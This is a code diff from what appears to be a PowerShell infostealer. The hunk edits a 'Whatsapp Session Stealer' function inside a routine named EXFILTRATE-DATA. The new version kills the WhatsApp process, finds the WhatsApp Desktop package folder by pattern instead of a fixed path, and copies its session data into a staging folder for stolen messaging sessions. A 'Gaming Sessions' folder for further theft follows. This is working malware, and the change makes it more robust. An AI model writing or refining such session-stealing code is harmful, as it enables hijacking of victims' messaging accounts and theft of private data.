@@ -159,14 +159,21 @@ function EXFILTRATE-DATA {
 	
 	# Whatsapp Session Stealer
     function whatsappstealer {
-            $processname = "whatsapp"
-            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
-            $whatsapp_session = "$messaging_sessions\Whatsapp"
-            New-Item -ItemType Directory -Force -Path $whatsapp_session
-            $whatsappfolder = "$env:localappdata\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
-            Copy-Item -Path "$whatsappfolder\LocalState" -Destination $whatsapp_session -Recurse -force
+                $processname = "whatsapp"
+                try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+                $whatsapp_session = "$messaging_sessions\Whatsapp"
+                New-Item -ItemType Directory -Force -Path $whatsapp_session
+                $regexPattern = "WhatsAppDesktop"
+                $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
+                if ($parentFolder){
+                $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
+                if ($localStateFolder) {
+                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
+                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
+               }
+          }
     }
-    whatsappstealer
+    whatsappstealer	
 
     # All Gaming Sessions
     New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
